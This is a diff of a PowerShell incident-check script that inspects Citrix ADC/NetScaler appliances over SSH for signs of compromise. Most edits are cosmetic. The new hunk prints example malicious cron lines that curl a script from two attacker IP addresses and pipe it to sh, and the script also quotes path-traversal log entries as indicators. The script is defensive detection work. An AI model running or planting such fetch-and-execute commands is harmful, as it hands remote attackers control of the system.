@@ -799,7 +799,7 @@ function ADCFindIfHacked {
     Results of the commands executed against a Citrix ADC / NetScaler
 .NOTES
     Function Name : ADCFindIfHacked.ps1
-    Version       : v0.7.2
+    Version       : v0.7.4
     Author        : John Billekens
     Requires      : PowerShell v5.1 and up
                     Posh-SSH (v2.2)
@@ -893,7 +893,7 @@ NOTE: The script is of my own and not the opinion of my employer!
             Write-Host -ForegroundColor Green "Citrix ADC / NetScaler version OK"
             Write-ToLogFile -I -C Version -M "Citrix ADC / NetScaler version OK"
         }
-        ""
+
         Write-Host -ForegroundColor White  "`r`nThis command should not return any results, if not the NetScaler could possibly be hacked."
         Write-ToLogFile -I -C $null -M "This command should not return any results, if not the NetScaler could possibly be hacked."
         $ShellCommand = 'shell ls /var/tmp/netscaler/portal/templates'
@@ -927,7 +927,7 @@ NOTE: The script is of my own and not the opinion of my employer!
         Write-Host -ForegroundColor Green  "INFO: Messages like `"GET /vpn/../vpns/portal/blkisazodfssy.xml HTTP/1.1`" could indicate a hack attempt"
         Write-ToLogFile -I -C Example -M "Messages like `"GET /vpn/../vpns/portal/blkisazodfssy.xml HTTP/1.1`" could indicate a hack attempt"
 
-        Write-Host -ForegroundColor White  "`r`nChecking Apache httpaccess log files"
+        Write-Host -ForegroundColor White  "Checking Apache httpaccess log files"
         Write-ToLogFile -I -C $null -M "Checking Apache httpaccess log files"
 
         $ShellCommand = 'shell cat /var/log/httpaccess.log | grep vpns | grep xml'
@@ -960,7 +960,7 @@ NOTE: The script is of my own and not the opinion of my employer!
 
         $ShellCommand = 'shell "cat /var/log/httperror.log | grep -B2 -A5 Traceback"'
         $Output = Invoke-SSHCommand -Index $($SSHSession.SessionId) -Command $ShellCommand -TimeOut $TimeOut
-        Write-Host -ForegroundColor White "Apache error logs`r`nCommand Executed: '$ShellCommand':"
+        Write-Host -ForegroundColor White "Apache error logs"
         Write-Host -ForegroundColor White "`r`nCommand Executed: '$ShellCommand':"
         Write-ToLogFile -I -C Command -M "Command Executed: '$ShellCommand':"
         Write-Host -ForegroundColor Yellow "$(CleanOutput -Data $Output.Output | Out-String)"
@@ -968,7 +968,6 @@ NOTE: The script is of my own and not the opinion of my employer!
 
         $ShellCommand = 'shell "gzcat /var/log/httperror.log.*.gz | grep -B2 -A5 Traceback"'
         $Output = Invoke-SSHCommand -Index $($SSHSession.SessionId) -Command $ShellCommand -TimeOut $TimeOut
-        Write-Host -ForegroundColor White "Apache error logs`r`nCommand Executed: '$ShellCommand':"
         Write-Host -ForegroundColor White "`r`nCommand Executed: '$ShellCommand':"
         Write-ToLogFile -I -C Command -M "Command Executed: '$ShellCommand':"
         Write-Host -ForegroundColor Yellow "$(CleanOutput -Data $Output.Output | Out-String)"
@@ -982,7 +981,7 @@ NOTE: The script is of my own and not the opinion of my employer!
         Write-ToLogFile -I -C Example -M "Messages like `"<Local7.notice> ns bash[3632]: nobody on (null) shell_command=`"uname -a`"`" could indicate a hack attempt"
         Write-Warning "Beware, these logs rotate rather quickly (1-2 days)"
         Write-ToLogFile -W -M "Beware, these logs rotate rather quickly (1-2 days)"
-        Write-Host -ForegroundColor White "Command Executed: '$ShellCommand':"
+        Write-Host -ForegroundColor White "`r`nCommand Executed: '$ShellCommand':"
         Write-ToLogFile -I -C Command -M "Command Executed: '$ShellCommand':"
         Write-Host -ForegroundColor Yellow "$(CleanOutput -Data $Output.Output | Out-String)"
         Write-ToLogFile -I -C Output -M "`r`n$(CleanOutput -Data $Output.Output | Out-String)"
@@ -1072,7 +1071,7 @@ nsmonitor:*:65532:65534:Netscaler Monitoring user:/var/nstmp/monitors:/nonexiste
 
 "@
         }
-        Write-Host -ForegroundColor White "Check if new users have been added to the password file`r`nCommand Executed: '$ShellCommand':"
+        Write-Host -ForegroundColor White "Check if new users have been added to the password file."
         Write-ToLogFile -I -C $null -M "Check if new users have been added to the password file."
         Write-Host -ForegroundColor White "The following output is from a Non-Compromised system, please compare."
         Write-ToLogFile -I -C $null -M "The following output is from a Non-Compromised system, please compare."
@@ -1093,6 +1092,14 @@ nsmonitor:*:65532:65534:Netscaler Monitoring user:/var/nstmp/monitors:/nonexiste
     
         Write-Host -ForegroundColor White "Check if users have cron jobs assigned."
         Write-ToLogFile -I -C $null -M "Check if users have cron jobs assigned."
+        Write-Host -ForegroundColor Green @"
+        
+Lookout for cron jobs like:" 
+
+* * * * * curl http://185.178.45.221/ci.sh | sh > /dev/null 2>&1
+* * * * * curl http://62.113.112.33/ci.sh | sh > /dev/null 2>&1
+
+"@
         ForEach ($User in $Users) {
             $ShellCommand = $("shell crontab -u {0} -l" -f $User)
             $Output = Invoke-SSHCommand -Index $($SSHSession.SessionId) -Command $ShellCommand -TimeOut $TimeOut
@@ -1116,6 +1123,7 @@ root      12508  0.0  0.1  9096  1344  ??  S     9:32AM   0:00.00 grep python
         Write-ToLogFile -I -C Example -M $Normal
         $ShellCommand = 'shell ps -aux | grep python'
         $Output = Invoke-SSHCommand -Index $($SSHSession.SessionId) -Command $ShellCommand -TimeOut $TimeOut
+        Write-Host -ForegroundColor White "`r`nCommand Executed: '$ShellCommand':"
         Write-ToLogFile -I -C Command -M "Command Executed: '$ShellCommand':"
         Write-Host -ForegroundColor Yellow "$(CleanOutput -Data $Output.Output | Out-String)"
         Write-ToLogFile -I -C Output -M "`r`n$(CleanOutput -Data $Output.Output | Out-String)"
